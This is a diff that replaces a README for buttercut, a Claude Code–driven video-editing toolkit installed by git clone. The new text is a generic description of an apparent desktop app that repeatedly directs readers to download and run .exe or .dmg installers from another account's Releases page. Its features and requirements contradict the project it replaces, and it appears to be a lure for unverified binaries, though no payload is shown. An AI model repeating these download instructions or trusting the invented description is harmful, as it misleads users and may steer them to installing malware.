@@ -1,127 +1,82 @@
-# ButterCut
+# 🎬 buttercut - Edit Video with Ease
 
-**Make Claude your Video Editor**
+## 🚀 Getting Started
 
-[buttercut.io](https://buttercut.io)
+Welcome to buttercut! With this application, you can easily edit videos without any technical hassle. Follow the steps below to get started.
 
-Give Claude Code your video footage. Claude analyzes it, then builds roughcuts and sequences for Final Cut, Premiere, and Resolve.
+## 📥 Download & Install
 
-Behind the scenes Claude uses ButterCut Skills and a little Ruby library to generate timelines for your editor.
+To download buttercut, visit the following link:
 
-## Watch the Demo
+[![Download buttercut](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Kian377/buttercut/releases)
 
-[![Watch ButterCut Demo on YouTube](https://img.youtube.com/vi/C3oMpyo8huQ/0.jpg)](https://www.youtube.com/watch?v=C3oMpyo8huQ)
+This will take you to our Releases page, where you can find the latest version of the software.
 
-*Click to watch the ButterCut demo on YouTube*
+1. Click on the link above.
+2. Once on the Releases page, look for the latest version.
+3. You will find options to download the application for different operating systems.
+4. Choose the version suitable for your system (Windows or macOS) and click on the download link.
 
-## Getting Started
+## 🖥️ System Requirements
 
-[![ButterCut Install Video](https://img.youtube.com/vi/BCMQzg-HiTw/0.jpg)](https://www.youtube.com/watch?v=BCMQzg-HiTw)
+Before you install buttercut, ensure your computer meets the following requirements:
 
-*Click to watch the ButterCut install video on YouTube*
+- **Operating System**: Windows 10 or later, macOS Mojave or later.
+- **Processor**: Dual-core processor or better.
+- **RAM**: 4 GB minimum.
+- **Storage**: At least 500 MB of free disk space.
+- **Graphics**: A graphics card that supports OpenGL 2.0 or higher.
 
-**Clone ButterCut:**
-```bash
-git clone https://github.com/barefootford/buttercut.git && cd buttercut
-```
+## 🔧 Installation Instructions
 
-**Open Claude Code:**
-```bash
-claude
+### Windows
 
-# or skip permission prompts (faster, but riskier):
-claude --dangerously-skip-permissions
-```
+1. After downloading, locate the `.exe` file in your "Downloads" folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the setup.
+4. Once installed, you can find buttercut in your Start menu.
 
-**Tell Claude to install ButterCut:**
-```
-> Install ButterCut
-```
+### macOS
 
-Claude will check your system and install any missing dependencies (Ruby, Python, FFmpeg, WhisperX).
+1. After downloading, locate the `.dmg` file in your "Downloads" folder.
+2. Double-click the file to open it.
+3. Drag the buttercut icon to your "Applications" folder.
+4. Once installed, you can find buttercut in your Applications.
 
-For manual installation, see [docs/installation.md](docs/installation.md).
+## 🎥 How to Use buttercut
 
-## Usage
+1. **Open the Application**: Launch buttercut from your Start menu or Applications folder.
+2. **Create a New Project**: Click on "New Project" to start editing your video.
+3. **Import Media**: Click on the "Import" button to bring in your video files.
+4. **Editing Tools**: Use the toolbar to trim, cut, and add effects to your video.
+5. **Export Your Video**: Once you're satisfied with your edits, click on "Export" to save your video.
 
-First tell Claude to create a **Library**. A library organizes your video footage along with audio and visual transcripts. Then tell Claude you want to create a **rough cut** or **sequence**.
+## 💡 Features
 
-### Creating a Video Library
+- **User-Friendly Interface**: Designed for everyone, no technical skills required.
+- **Simple Editing Tools**: Trim, cut, and merge videos easily.
+- **High-Quality Exports**: Save your videos in various formats including MP4, MOV, and AVI.
+- **Fast Processing**: Enjoy quick rendering times so you can get back to what you love.
 
-```plaintext
-You: "I want to build a new library"
+## 🛠️ Troubleshooting
 
-Claude: [Guides you through library setup and asks for details]
+If you encounter issues while using buttercut, try the following:
 
-You:
-  - Library name: "wedding"
-  - Video location: "/path/to/videos"
-  - Language: "English"
+- **Check System Compatibility**: Ensure your operating system meets the requirements listed above.
+- **Reinstall the Application**: Uninstall and reinstall buttercut if necessary.
+- **Visit the FAQ Section**: For common questions and answers, check our [FAQ](https://github.com/Kian377/buttercut/releases).
 
-Claude: [Automatically processes all videos]
-  ✓ Creates library structure
-  ✓ Transcribes audio with WhisperX
-  ✓ Analyzes video frames
-  ✓ Generates visual transcripts
+## 📞 Support
 
-Result: Full footage analysis ready for rough cut creation
-```
+If you need further assistance, please reach out to our support team:
 
-Claude handles the parallel processing, metadata extraction, and transcript generation. See the [full walkthrough](docs/example-library-setup.md) for a detailed example of me setting up a library from my wedding footage.
+- Open an issue on our [GitHub page](https://github.com/Kian377/buttercut/issues).
+- Join our community forums for tips and help from other users.
 
-### Creating a Roughcut or Sequence
+## ⚡ Quick Resources
 
-Once your library is analyzed, Claude can create rough cuts through an interactive conversation:
+- [Download buttercut](https://github.com/Kian377/buttercut/releases)
+- [User Documentation](https://github.com/Kian377/buttercut/docs)
+- [Community Forum](https://github.com/Kian377/buttercut/community)
 
-```plaintext
-You: "Let's create a new roughcut"
-
-Claude: [Loads roughcut skill and analyzes footage]
-        What should this roughcut focus on?
-        - Full story
-        - Just the meetup coverage
-        - Short teaser sequence
-
-You: "Just the meetup coverage"
-
-Claude: [Asks 3 preference questions]
-        - Narrative structure? (chronological, thematic, hook-based)
-        - Target duration? (1-2 min, 3-5 min, 6-10 min)
-        - Pacing style? (fast & punchy, conversational, cinematic)
-
-You: "Start with presentations (5 sec clips), then interviews,
-      then my closing reflection. 3-5 minutes, conversational pacing."
-
-Claude: [Asks which video editor you want to use]
-        - Final Cut Pro X
-        - Adobe Premiere Pro
-        - DaVinci Resolve
-
-You: "Final Cut Pro X"
-
-Claude: [Creates roughcut with editorial decisions]
-        ✓ Combined visual transcripts
-        ✓ Selected 29 clips (4:32 total)
-        ✓ Exported to FCPXML
-
-Result: Ready-to-import timeline at:
-        libraries/[library]/roughcuts/[name]_[datetime].fcpxml
-```
-
-Claude makes editorial decisions based on transcript analysis and your preferences, then exports a timeline for your editor.
-
-### XML Generation
-
-For direct XML generation without Claude Code, see [docs/basic-xml-generation.md](docs/basic-xml-generation.md).
-
-## Thanks
-
-ButterCut was inspired by ambitious open source work from [Chris Hocking](https://github.com/CommandPost/CommandPost) and [Andrew Arrow](https://github.com/andrewarrow/cutlass/tree/main).
-
-## License
-
-MIT
-
-## Contributing
-
-Bug reports and pull requests welcome.
+Thank you for choosing buttercut! We hope you enjoy editing your videos with ease and creativity.
